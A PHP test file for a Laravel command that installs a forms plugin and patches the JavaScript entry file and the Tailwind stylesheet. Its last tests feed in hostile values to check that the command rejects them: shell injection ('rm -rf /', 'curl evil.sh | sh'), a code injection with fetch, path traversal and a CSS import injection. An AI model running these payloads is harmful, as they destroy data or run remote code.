<?php

use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Process;

beforeEach(function (): void {
    $this->appPath = sys_get_temp_dir().'/xelqun-plugin-'.uniqid();

    File::ensureDirectoryExists("{$this->appPath}/resources/js");
    File::ensureDirectoryExists("{$this->appPath}/resources/css");
    File::put("{$this->appPath}/package.json", '{}');

    $this->app->setBasePath($this->appPath);

    Process::fake();
});

afterEach(function (): void {
    File::deleteDirectory($this->appPath);
});

function pluginManifest(string $appPath, array $xelqun = [], string $package = 'acme/rating'): void
{
    File::ensureDirectoryExists("{$appPath}/vendor/{$package}");
    File::put("{$appPath}/vendor/{$package}/composer.json", (string) json_encode(['name' => $package, 'extra' => ['xelqun' => $xelqun]]));
}

function entryFile(string $appPath, string $source): void
{
    File::put("{$appPath}/resources/js/app.ts", $source);
}

function entryAfterInstall(string $appPath, string $source): string
{
    pluginManifest($appPath);
    entryFile($appPath, $source);

    test()->artisan('xelqun-forms:plugin', ['package' => 'acme/rating'])->assertSuccessful();

    return File::get("{$appPath}/resources/js/app.ts");
}

it('installs the npm package named by the plugin', function (): void {
    pluginManifest($this->appPath, ['npm' => '@acme/forms-rating']);
    File::put("{$this->appPath}/pnpm-lock.yaml", '');

    $this->artisan('xelqun-forms:plugin', ['package' => 'acme/rating'])->assertSuccessful();

    Process::assertRan(fn ($process): bool => $process->command === 'pnpm add @acme/forms-rating');
});

it('falls back to the convention without extra.xelqun', function (): void {
    pluginManifest($this->appPath);
    entryFile($this->appPath, "createXelqunForms()\n");

    $this->artisan('xelqun-forms:plugin', ['package' => 'acme/rating'])->assertSuccessful();

    Process::assertRan(fn ($process): bool => $process->command === 'npm install @acme/rating');
    expect(File::get("{$this->appPath}/resources/js/app.ts"))->toContain("import { ratingPlugin } from '@acme/rating';");
});

it('skips npm with --without-node', function (): void {
    pluginManifest($this->appPath);

    $this->artisan('xelqun-forms:plugin', ['package' => 'acme/rating', '--without-node' => true])->assertSuccessful();

    Process::assertNothingRan();
});

it('adds the plugin to the entry file', function (string $before, string $after): void {
    expect(entryAfterInstall($this->appPath, $before))->toContain($after);
})->with([
    'no options' => [
        "app.use(createXelqunForms());\n",
        'app.use(createXelqunForms({ plugins: [ratingPlugin()] }));',
    ],
    'components option' => [
        "app.use(createXelqunForms({ components: { 'a/b': B } }));\n",
        "createXelqunForms({ plugins: [ratingPlugin()], components: { 'a/b': B } })",
    ],
    'multi-line options' => [
        "createXelqunForms({\n    components,\n});\n",
        "createXelqunForms({\n    plugins: [ratingPlugin()],\n    components,\n});",
    ],
    'components with a lazy import' => [
        "createXelqunForms({ components: { 'a/b': () => import('./b.vue') } });\n",
        "createXelqunForms({ plugins: [ratingPlugin()], components: { 'a/b': () => import('./b.vue') } });",
    ],
    'empty plugins' => [
        "createXelqunForms({ plugins: [] });\n",
        'createXelqunForms({ plugins: [ratingPlugin()] });',
    ],
    'existing plugin' => [
        "createXelqunForms({ plugins: [one()] });\n",
        'createXelqunForms({ plugins: [one(), ratingPlugin()] });',
    ],
    'existing plugins, trailing comma' => [
        "createXelqunForms({ plugins: [one(), two(),] });\n",
        'createXelqunForms({ plugins: [one(), two(), ratingPlugin()] });',
    ],
    'multi-line plugins' => [
        "createXelqunForms({\n    plugins: [\n        one(),\n    ],\n});\n",
        "plugins: [\n        one(),\n        ratingPlugin(),\n    ],",
    ],
    'plugin with options' => [
        "createXelqunForms({ plugins: [one({ size: 'lg' })] });\n",
        "createXelqunForms({ plugins: [one({ size: 'lg' }), ratingPlugin()] });",
    ],
    'a parenthesis in a string' => [
        "createXelqunForms({ components: { 'a/b': load(')') } });\n",
        "createXelqunForms({ plugins: [ratingPlugin()], components: { 'a/b': load(')') } });",
    ],
]);

it('leaves a plugin that is registered with options alone', function (): void {
    $source = "import { ratingPlugin } from '@acme/rating';\n\napp.use(createXelqunForms({ plugins: [ratingPlugin({ max: 10 })] }));\n";

    expect(entryAfterInstall($this->appPath, $source))->toBe($source);
});

it('uses an import that is already there', function (): void {
    $source = entryAfterInstall($this->appPath, "import { ratingPlugin } from '@acme/rating';\n\ncreateXelqunForms();\n");

    expect(substr_count($source, 'import { ratingPlugin }'))->toBe(1)
        ->and($source)->toContain('createXelqunForms({ plugins: [ratingPlugin()] });');
});

it('does not mistake other code for an import of the plugin', function (): void {
    $source = entryAfterInstall($this->appPath, "import a from 'a'\nconst ratingPlugin = 1, from = 2\ncreateXelqunForms()\n");

    expect($source)->toContain("import { ratingPlugin } from '@acme/rating';");
});

it('ignores comments when it reads the entry file', function (string $before, string $after): void {
    expect(entryAfterInstall($this->appPath, $before))->toContain($after);
})->with([
    'a commented-out call' => [
        "// createXelqunForms({ plugins: [legacy()] })\napp.use(createXelqunForms());\n",
        'app.use(createXelqunForms({ plugins: [ratingPlugin()] }));',
    ],
    'a block comment' => [
        "/* createXelqunForms() */\napp.use(createXelqunForms());\n",
        "/* createXelqunForms() */\napp.use(createXelqunForms({ plugins: [ratingPlugin()] }));",
    ],
    'a plugin that is only mentioned' => [
        "// TODO: ratingPlugin()\napp.use(createXelqunForms());\n",
        'app.use(createXelqunForms({ plugins: [ratingPlugin()] }));',
    ],
    'an apostrophe in a comment' => [
        "// don't remove\napp.use(createXelqunForms());\n",
        'app.use(createXelqunForms({ plugins: [ratingPlugin()] }));',
    ],
    'slashes in a string' => [
        "const url = 'https://example.test';\napp.use(createXelqunForms());\n",
        'app.use(createXelqunForms({ plugins: [ratingPlugin()] }));',
    ],
]);

it('adds the import after the existing imports', function (): void {
    $source = entryAfterInstall($this->appPath, "import a from 'a';\nimport { createXelqunForms } from '@xelqun/forms';\n\napp.use(createXelqunForms());\n");

    expect($source)->toContain("import { createXelqunForms } from '@xelqun/forms';\nimport { ratingPlugin } from '@acme/rating';\n\napp");
});

it('leaves an entry file it can not read alone and prints the step', function (string $source): void {
    pluginManifest($this->appPath);
    entryFile($this->appPath, $source);

    $this->artisan('xelqun-forms:plugin', ['package' => 'acme/rating'])
        ->expectsOutputToContain('Finish these steps by hand')
        ->assertSuccessful();

    expect(File::get("{$this->appPath}/resources/js/app.ts"))->toBe($source);
})->with([
    'no call' => "createInertiaApp({});\n",
    'options in a variable' => "createXelqunForms(options);\n",
    'plugins in a variable' => "createXelqunForms({ plugins: list });\n",
    'plugins shorthand' => "createXelqunForms({ plugins });\n",
    'a spread array' => "createXelqunForms({ plugins: [...[one()]] });\n",
    'an unclosed call' => "createXelqunForms({ plugins: [\n",
    'spread options' => "createXelqunForms({ ...sharedOptions });\n",
    'a spread in the plugins' => "createXelqunForms({ plugins: [...shared] });\n",
    'a comment inside the call' => "createXelqunForms({\n    // keep this\n    components,\n});\n",
]);

it('does not add the plugin twice', function (): void {
    pluginManifest($this->appPath);
    entryFile($this->appPath, "createXelqunForms();\n");
    File::put("{$this->appPath}/resources/css/app.css", "@import 'tailwindcss';\n");

    $this->artisan('xelqun-forms:plugin', ['package' => 'acme/rating'])->assertSuccessful();
    $script = File::get("{$this->appPath}/resources/js/app.ts");
    $styles = File::get("{$this->appPath}/resources/css/app.css");

    $this->artisan('xelqun-forms:plugin', ['package' => 'acme/rating'])->assertSuccessful();

    expect(File::get("{$this->appPath}/resources/js/app.ts"))->toBe($script)
        ->and(File::get("{$this->appPath}/resources/css/app.css"))->toBe($styles);
});

it('adds the Tailwind source', function (string $before, string $after): void {
    pluginManifest($this->appPath);
    File::put("{$this->appPath}/resources/css/app.css", $before);

    $this->artisan('xelqun-forms:plugin', ['package' => 'acme/rating'])->assertSuccessful();

    expect(File::get("{$this->appPath}/resources/css/app.css"))->toContain($after);
})->with([
    'after the last @source' => [
        "@import 'tailwindcss';\n@source '../a';\n@source '../b';\n\n@theme {}\n",
        "@source '../b';\n@source '../../node_modules/@acme/rating/resources/js/**/*.vue';\n\n@theme {}",
    ],
    'after the stylesheet' => [
        "@import 'tailwindcss';\n@import '@xelqun/forms/style.css';\n\n@theme {}\n",
        "@import '@xelqun/forms/style.css';\n@source '../../node_modules/@acme/rating/resources/js/**/*.vue';\n",
    ],
    'after tailwind' => [
        "@import \"tailwindcss\";\n",
        "@import \"tailwindcss\";\n@source '../../node_modules/@acme/rating/resources/js/**/*.vue';\n",
    ],
]);

it('uses the source glob of the plugin', function (): void {
    pluginManifest($this->appPath, ['source' => 'dist/**/*.{js,vue}']);
    File::put("{$this->appPath}/resources/css/app.css", "@import 'tailwindcss';\n");

    $this->artisan('xelqun-forms:plugin', ['package' => 'acme/rating'])->assertSuccessful();

    expect(File::get("{$this->appPath}/resources/css/app.css"))->toContain('@acme/rating/dist/**/*.{js,vue}');
});

it('prints the step when there is no stylesheet to patch', function (): void {
    pluginManifest($this->appPath);

    $this->artisan('xelqun-forms:plugin', ['package' => 'acme/rating'])
        ->expectsOutputToContain('@source')
        ->assertSuccessful();
});

it('needs the Composer package first', function (): void {
    $this->artisan('xelqun-forms:plugin', ['package' => 'acme/missing'])
        ->expectsOutputToContain('composer require acme/missing')
        ->assertFailed();

    Process::assertNothingRan();
});

it('touches no file when the npm install fails', function (): void {
    Process::fake(['*' => Process::result(exitCode: 1)]);
    pluginManifest($this->appPath);
    entryFile($this->appPath, $source = "createXelqunForms();\n");

    $this->artisan('xelqun-forms:plugin', ['package' => 'acme/rating'])->assertFailed();

    expect(File::get("{$this->appPath}/resources/js/app.ts"))->toBe($source);
});

it('refuses a package name that could escape the vendor directory', function (string $package): void {
    $this->artisan('xelqun-forms:plugin', ['package' => $package])
        ->expectsOutputToContain('not a Composer package name')
        ->assertFailed();

    Process::assertNothingRan();
})->with(['../../etc', 'acme', 'acme/rating; rm -rf /', 'acme/../..']);

it('refuses manifest values that are not what they claim to be', function (array $xelqun): void {
    pluginManifest($this->appPath, $xelqun);
    entryFile($this->appPath, $source = "createXelqunForms();\n");
    File::put("{$this->appPath}/resources/css/app.css", $styles = "@import 'tailwindcss';\n");

    $this->artisan('xelqun-forms:plugin', ['package' => 'acme/rating'])
        ->expectsOutputToContain('is not valid')
        ->assertFailed();

    Process::assertNothingRan();
    expect(File::get("{$this->appPath}/resources/js/app.ts"))->toBe($source)
        ->and(File::get("{$this->appPath}/resources/css/app.css"))->toBe($styles);
})->with([
    'shell in the npm name' => [['npm' => '@acme/rating; curl evil.sh | sh']],
    'code in the plugin name' => [['plugin' => 'x(); fetch("//evil"); y']],
    'traversal in the source' => [['source' => '../../../secrets/*']],
    'quote in the source' => [['source' => "a';@import 'evil"]],
    'wrong type' => [['npm' => ['a']]],
]);
